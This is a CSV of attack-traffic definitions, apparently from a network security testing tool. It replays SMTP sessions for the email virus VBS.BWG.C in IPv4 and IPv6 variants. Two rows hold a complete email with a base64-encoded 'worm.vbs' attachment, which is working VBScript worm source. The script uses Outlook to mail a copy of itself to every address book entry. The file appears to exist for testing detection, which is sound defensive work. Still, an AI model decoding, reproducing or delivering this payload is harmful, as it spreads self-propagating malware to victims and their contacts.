XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,[[0D 0A ]].[[0D 0A]]
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,QUIT[[0D 0A]]
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
VBS.BWG.C.3d3b062a_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 3d3b062a999e5355e0ca86d89a933b3f.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,"Content-Transfer-Encoding: binary[[0A ]]Content-Type: multipart/mixed; boundary=""_----------=_1135112797101060""[[0A ]]MIME-Version: 1.0[[0A ]]X-Mailer: MIME::Lite 3.01 (F2.73; A1.67; B3.05; Q3.03)[[0A ]]Date: Tue, 20 Dec 2005 21:06:37 UT[[0A ]]From: phar@example.com[[0A ]]To: victim@example.net[[0A ]]Subject: 'Curiouser and curiouser!' cried Alice.[[0A 0A ]]This is a multi-part message in MIME format.[[0A 0A ]]--_----------=_1135112797101060[[0A ]]Content-Disposition: inline[[0A ]]Content-Length: 635[[0A ]]Content-Transfer-Encoding: binary[[0A ]]Content-Type: text/plain[[0A 0A ]]`But I don't want to go among mad people,' Alice remarked.[[0A ]]`Oh, you can't help that,' said the Cat: `we're all mad here. I'm mad.  You're mad.'[[0A ]]`How do you know I'm mad?' said Alice.[[0A ]]`You must be,' said the Cat, `or you wouldn't have come here.'[[0A ]]Alice didn't think that proved it at all; however, she went on` And how do you know that you're mad?'[[0A ]]`To begin with,' said the Cat, `a dog's not mad.  You grant that?'[[0A ]]`I suppose so,' said Alice.[[0A ]]`Well, then,' the Cat went on, `you see, a dog growls when it's angry, and wags its tail when it's pleased.  Now I growl when I'm pleased, and wag my tail [[0A ]]when I'm angry.  Therefore I'm mad.'[[0A ]]--_----------=_1135112797101060[[0A ]]Content-Disposition: attachment; filename=""worm.vbs""[[0A ]]Content-Transfer-Encoding: base64[[0A ]]Content-Type: application/octet-stream; name=""worm.vbs""[[0A 0A ]]RGltIHggDQpvbiBlcnJvciByZXN1bWUgbmV4dCANClNldCBmc28gPSJTY3Jp[[0A ]]cHRpbmcuRmlsZVN5c3RlbS5PYmplY3QiIA0KU2V0IHNvPUNyZWF0ZU9iamVj[[0A ]]dChmc28pIA0KU2V0IG9sPUNyZWF0ZU9iamVjdCgiT3V0bG9vay5BcHBsaWNh[[0A ]]dGlvbiIpIA0KU2V0IG91dD0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIk91dGxv[[0A ]]b2suQXBwbGljYXRpb24iKSANClNldCBtYXBpID0gb3V0LkdldE5hbWVTcGFj[[0A ]]ZSgiTUFQSSIpIA0KU2V0IGEgPSBtYXBpLkFkZHJlc3NMaXN0cygxKSANCkZv[[0A ]]ciB4PTEgVG8gYS5BZGRyZXNzRW50cmllcy5Db3VudCANClNldCBNYWlsPW9s[[0A ]]LkNyZWF0ZUl0ZW0oMCkgDQpNYWlsLnRvPW9sLkdldE5hbWVTcGFjZSgiTUFQ[[0A ]]SSIpLkFkZHJlc3NMaXN0cygxKS5BZGRyZXNzRW50cmllcyh4KSANCk1haWwu[[0A ]]U3ViamVjdD0iU3ViamVjdCIgDQpNYWlsLkJvZHk9IkJvZHkiIA0KTWFpbC5B[[0A ]]dHRhY2htZW50cy5BZGQgV3NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KTWFpbC5T[[0A ]]ZW5kIA0KTmV4dCANCm9sLlF1aXQg[[0A 0A ]]--_----------=_1135112797101060--[[0A 0A 0A 0A]]"
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,[[0D 0A ]].[[0D 0A]]
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,QUIT[[0D 0A]]
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 [[4f 4b 0d 0a]]
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 Accepted[[0d 0a]]
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
VBS.BWG.C.88b8c658.xml,Email Virus VBS.BWG.C,This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server.,SMTP,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
﻿VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,"Content-Transfer-Encoding: binary[[0A ]]Content-Type: multipart/mixed; boundary=""_----------=_1135112797101060""[[0A ]]MIME-Version: 1.0[[0A ]]X-Mailer: MIME::Lite 3.01 (F2.73; A1.67; B3.05; Q3.03)[[0A ]]Date: Tue, 20 Dec 2005 21:06:37 UT[[0A ]]From: phar@example.com[[0A ]]To: victim@example.net[[0A ]]Subject: 'Curiouser and curiouser!' cried Alice.[[0A 0A ]]This is a multi-part message in MIME format.[[0A 0A ]]--_----------=_1135112797101060[[0A ]]Content-Disposition: inline[[0A ]]Content-Length: 635[[0A ]]Content-Transfer-Encoding: binary[[0A ]]Content-Type: text/plain[[0A 0A ]]`But I don't want to go among mad people,' Alice remarked.[[0A ]]`Oh, you can't help that,' said the Cat: `we're all mad here. I'm mad.  You're mad.'[[0A ]]`How do you know I'm mad?' said Alice.[[0A ]]`You must be,' said the Cat, `or you wouldn't have come here.'[[0A ]]Alice didn't think that proved it at all; however, she went on` And how do you know that you're mad?'[[0A ]]`To begin with,' said the Cat, `a dog's not mad.  You grant that?'[[0A ]]`I suppose so,' said Alice.[[0A ]]`Well, then,' the Cat went on, `you see, a dog growls when it's angry, and wags its tail when it's pleased.  Now I growl when I'm pleased, and wag my tail [[0A ]]when I'm angry.  Therefore I'm mad.'[[0A ]]--_----------=_1135112797101060[[0A ]]Content-Disposition: attachment; filename=""worm.vbs""[[0A ]]Content-Transfer-Encoding: base64[[0A ]]Content-Type: application/octet-stream; name=""worm.vbs""[[0A 0A ]]RGltIHggDQpvbiBlcnJvciByZXN1bWUgbmV4dCANClNldCBmc28gPSJTY3Jp[[0A ]]cHRpbmcuRmlsZVN5c3RlbS5PYmplY3QiIA0KU2V0IHNvPUNyZWF0ZU9iamVj[[0A ]]dChmc28pIA0KU2V0IG9sPUNyZWF0ZU9iamVjdCgiT3V0bG9vay5BcHBsaWNh[[0A ]]dGlvbiIpIA0KU2V0IG91dD0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIk91dGxv[[0A ]]b2suQXBwbGljYXRpb24iKSANClNldCBtYXBpID0gb3V0LkdldE5hbWVTcGFj[[0A ]]ZSgiTUFQSSIpIA0KU2V0IGEgPSBtYXBpLkFkZHJlc3NMaXN0cygxKSANCkZv[[0A ]]ciB4PTEgVG8gYS5BZGRyZXNzRW50cmllcy5Db3VudCANClNldCBNYWlsPW9s[[0A ]]LkNyZWF0ZUl0ZW0oMCkgDQpNYWlsLnRvPW9sLkdldE5hbWVTcGFjZSgiTUFQ[[0A ]]SSIpLkFkZHJlc3NMaXN0cygxKS5BZGRyZXNzRW50cmllcyh4KSANCk1haWwu[[0A ]]U3ViamVjdD0iU3ViamVjdCIgDQpNYWlsLkJvZHk9IkJvZHkiIA0KTWFpbC5B[[0A ]]dHRhY2htZW50cy5BZGQgV3NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KTWFpbC5T[[0A ]]ZW5kIA0KTmV4dCANCm9sLlF1aXQg[[0A 0A ]]--_----------=_1135112797101060--[[0A 0A 0A 0A]]"
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,[[0D 0A ]].[[0D 0A]]
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,QUIT[[0D 0A]]
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,220 f[[6f ]]ster ES[[4d ]]TP[[0d 0a]]
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250[[2d ]]SI[[5a ]]E 52428800[[0d 0a ]]250[[2d ]]PIPE[[4c ]]I[[4e ]]I[[4e ]]G[[0d 0a ]]250[[2d ]]AUTH P[[4c ]]AI[[4e ]] [[4c 4f ]]GI[[4e 0d 0a]]
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b 0d 0a]]
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 Accepted[[0d 0a]]
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,"354 E[[6e ]]ter [[6d ]]essage[[2c ]] e[[6e ]]di[[6e ]]g with ""[[2e ]]"" [[6f 6e ]] a [[6c ]]i[[6e ]]e by itse[[6c ]]f[[0d 0a]]"
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,250 [[4f 4b ]] id[[3d ]]1HcVW[[6f 2d ]]0007YR[[2d ]]S8
VBS.BWG.C.88b8c658_IPv6.xml,Email Virus VBS.BWG.C (IPv6 Version),This is the email virus VBS.BWG.C as detected by ClamAV. This email caught by imperfect networks was applied the following hash value for identification: 88b8c658ff12611b20152682a409eaf1.  This attack is delivered via SMTP to a email server. (IPv6 Version),SMTP/IPv6,TCP,221 f[[6f ]]ster c[[6c 6f ]]si[[6e ]]g c[[6f 6e 6e ]]ecti[[6f 6e 0d 0a]]
